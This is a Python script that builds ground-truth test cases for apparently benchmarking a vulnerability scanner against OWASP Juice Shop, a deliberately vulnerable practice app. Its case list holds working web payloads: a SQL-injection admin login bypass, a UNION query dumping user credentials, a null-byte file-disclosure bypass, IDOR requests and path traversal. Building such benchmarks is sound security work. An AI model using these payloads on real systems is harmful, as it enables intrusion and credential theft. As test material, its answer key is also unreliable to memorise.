#!/usr/bin/env python3
"""gen_gt.py —— 生成 Juice Shop 的 ground truth（值来自运行时 profile，不是手输）

每条用例都标注 `oracle`：对应哪条官方 challenge.key。
跑完之后用 /api/Challenges 的 solved 状态做**第二 oracle**交叉验证 ——
这是这次和靶场实验最大的区别：真值不再由我说了算。
"""
import json
import os

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
PROFILE = os.path.join(ROOT, "profiles", "juiceshop.json")
OUT = os.path.join(HERE, "gt", "ground_truth_juice.json")

P = json.load(open(PROFILE, encoding="utf-8"))["artifacts"]
SELF_EMAIL, OTHER_EMAIL = P["self_email"], P["other_email"]
SELF_UID, OTHER_UID = P["self_uid"], P["other_uid"]
SELF_BID, OTHER_BID = P["self_bid"], P["other_bid"]
PW = P["auth_password"]
MARK = "UNIONMARKJ001"

LOGIN = {"method": "POST", "path": "/rest/user/login",
         "json": {"email": SELF_EMAIL, "password": PW},
         "capture": {"name": "tok", "from": "authentication.token"}}
AUTH = {"Authorization": "Bearer ${tok}"}

vulns = [
    # ---------------- 正样本：应当 confirmed 且被官方 oracle 认证 ----------------
    {"id": "J-LOGIN-SQLI", "class": "auth_bypass_sqli", "criterion": "authentication_bypass",
     "oracle": "loginAdminChallenge",
     "request": {"method": "POST", "path": "/rest/user/login",
                 "json": {"email": "admin@juice-sh.op' --", "password": "x"}},
     "control": [{"method": "POST", "path": "/rest/user/login",
                  "json": {"email": "admin@juice-sh.op", "password": "wrong-pass-xyz"}}],
     "note": "注释符截断口令校验；对照=同账号错口令必须 401"},

    {"id": "J-UNION-CRED", "class": "union_credential_dump", "criterion": "database_access",
     "oracle": "unionSqlInjectionChallenge",
     "request": {"method": "GET", "path": "/rest/products/search",
                 "params": {"q": "apple')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--"}},
     "control": [{"method": "GET", "path": "/rest/products/search", "params": {"q": "apple"}}],
     "control_assert": {"type": "body_not_matches", "value": r"[0-9a-f]{32}"},
     "note": "官方挑战叫 User Credentials：必须**导出凭据**才算，只证明注入存在不算。"
             "列数 10 是逐个数出来的"},

    {"id": "J-FTP-DOC", "class": "confidential_document", "criterion": "information_disclosure",
     "oracle": "directoryListingChallenge",
     "request": {"method": "GET", "path": "/ftp/acquisitions.md"},
     "control": [{"method": "GET", "path": "/ftp/package.json.bak"}],
     "control_assert": {"type": "status", "value": 403},
     "note": "官方挑战实为 Confidential Document（访问机密文档），不是「目录列表」——"
             "一开始我映射错了，靠 oracle 不一致才发现"},

    {"id": "J-IDOR-BASKET", "class": "idor", "criterion": "unauthorized_data_access",
     "oracle": "basketAccessChallenge",
     "pre": [LOGIN],
     "control_pre": [LOGIN],
     "request": {"method": "GET", "path": "/rest/basket/%s" % OTHER_BID, "headers": AUTH},
     "control": [{"method": "GET", "path": "/rest/basket/%s" % SELF_BID, "headers": AUTH}],
     "note": "用 A 的会话读 B 的购物车（B 的 bid 由运行时注册得到，非预置）"},

    {"id": "J-NULLBYTE", "class": "sensitive_file_disclosure", "criterion": "file_access",
     "oracle": "nullByteChallenge",
     "oracle_extra": ["forgottenDevBackupChallenge"],
     "request": {"method": "GET", "path": "/ftp/package.json.bak%2500.md"},
     "control": [{"method": "GET", "path": "/ftp/package.json.bak"}],
     "note": "null byte 绕过后缀白名单；对照=不带 %%2500 时应被拒。"
             "实测同一请求会同时解掉 forgottenDevBackup（多标签），已记入 oracle_extra"},

    {"id": "J-FTP-DIRLIST", "class": "directory_listing", "criterion": "information_disclosure",
     "oracle": None,
     "request": {"method": "GET", "path": "/ftp/"},
     "control": [{"method": "GET", "path": "/"}],
     "note": "目录索引页暴露。**20.3.0 的 116 条挑战里没有「Directory Listing」这一条**"
             "（directoryListingChallenge 实为 Confidential Document）→ 本用例无官方 oracle，"
             "只能靠闸门自证"},

    {"id": "J-METRICS", "class": "exposed_metrics", "criterion": "information_disclosure",
     "oracle": "exposedMetricsChallenge",
     "request": {"method": "GET", "path": "/metrics"},
     "control": [{"method": "GET", "path": "/"}],
     "note": "/metrics 无需认证"},

    {"id": "J-BAC-USER1", "class": "data_exposure_object", "criterion": "unauthorized_data_access",
     "oracle": None,
     "pre": [LOGIN],
     "control_pre": [LOGIN],
     "request": {"method": "GET", "path": "/api/Users/1", "headers": AUTH},
     "control": [{"method": "GET", "path": "/api/Users/%s" % SELF_UID, "headers": AUTH}],
     "control_assert": {"type": "json_path_equals", "path": "data.email", "value": SELF_EMAIL},
     "note": "普通用户读 admin 的记录；对照=读自己时 email 必须等于自己"},

    {"id": "J-USERLIST", "class": "data_exposure_list", "criterion": "unauthorized_data_access",
     "oracle": None,
     "pre": [LOGIN],
     "request": {"method": "GET", "path": "/api/Users", "headers": AUTH},
     "control": [{"method": "GET", "path": "/api/Users"}],
     "control_assert": {"type": "status", "value": 401},
     "note": "普通用户拿到全量用户列表；对照=不带 token 必须 401"},

    # ---------------- 负样本：应当 rejected / blocked，绝不能 confirmed ----------------
    {"id": "N-LOGIN-NOUSER", "class": "auth_bypass_sqli", "criterion": "authentication_bypass",
     "oracle": None, "expect": "rejected",
     "request": {"method": "POST", "path": "/rest/user/login",
                 "json": {"email": "nobody-%s@nowhere.local' --" % SELF_UID, "password": "x"}},
     "control": [{"method": "POST", "path": "/rest/user/login",
                  "json": {"email": "admin@juice-sh.op", "password": "wrong-pass-xyz"}}],
     "note": "同样的注释符手法，但账号不存在 → 必须拒绝"},

    {"id": "N-UNION-9COLS", "class": "sql_injection", "criterion": "database_access",
     "oracle": None, "expect": "rejected",
     "request": {"method": "GET", "path": "/rest/products/search",
                 "params": {"q": "apple')) UNION SELECT 1,2,3,4,5,'%s',7,8,9--" % MARK}},
     "control": [{"method": "GET", "path": "/rest/products/search", "params": {"q": "apple"}}],
     "note": "列数错 → 只有 SQL 报错，marker 绝不该出现"},

    {"id": "N-BASKET-404", "class": "idor", "criterion": "unauthorized_data_access",
     "oracle": None, "expect": "rejected",
     "pre": [LOGIN],
     "control_pre": [LOGIN],
     "request": {"method": "GET", "path": "/rest/basket/999999", "headers": AUTH},
     "control": [{"method": "GET", "path": "/rest/basket/%s" % SELF_BID, "headers": AUTH}],
     "note": "不存在的购物车 → 必须拒绝"},

    {"id": "N-TRAVERSAL", "class": "sensitive_file_disclosure", "criterion": "file_access",
     "oracle": None, "expect": "rejected",
     "request": {"method": "GET", "path": "/ftp/../../../windows/win.ini"},
     "control": [{"method": "GET", "path": "/ftp/package.json.bak"}],
     "note": "路径穿越取系统文件 → 不该成功"},

    {"id": "N-USERS-NOAUTH", "class": "data_exposure_list", "criterion": "unauthorized_data_access",
     "oracle": None, "expect": "blocked",
     "request": {"method": "GET", "path": "/api/Users"},
     "control": [{"method": "GET", "path": "/api/Users"}],
     "note": "无凭证 → 期望被判 blocked（需要认证），而不是 rejected"},

    {"id": "N-METRICS-INDEX", "class": "exposed_metrics", "criterion": "information_disclosure",
     "oracle": None, "expect": "rejected",
     "request": {"method": "GET", "path": "/"},
     "control": [{"method": "GET", "path": "/"}],
     "note": "首页不含指标格式 → 必须拒绝"},
]

doc = {
    "target": "OWASP Juice Shop 20.3.0 (official prebuilt, node22/win32)",
    "gt_source": "challenges 定义取自目标自身的 GET /api/Challenges（116 条），"
                 "以及 apps/juice/gt/probe2_results.json 的实测记录",
    "identity": {"self": SELF_EMAIL, "other": OTHER_EMAIL,
                 "self_uid": SELF_UID, "other_uid": OTHER_UID,
                 "note": "由 identity.py 运行时注册，非预置常量"},
    "oracle": "第二条独立判据：GET /api/Challenges 的 solved 字段（应用自身记账）",
    "vulns": vulns,
}
with open(OUT, "w", encoding="utf-8") as f:
    json.dump(doc, f, ensure_ascii=False, indent=2)
print("wrote %s  cases=%d" % (OUT, len(vulns)))
for v in vulns:
    print("  %-18s %-26s oracle=%s" % (v["id"], v["class"], v.get("oracle")))
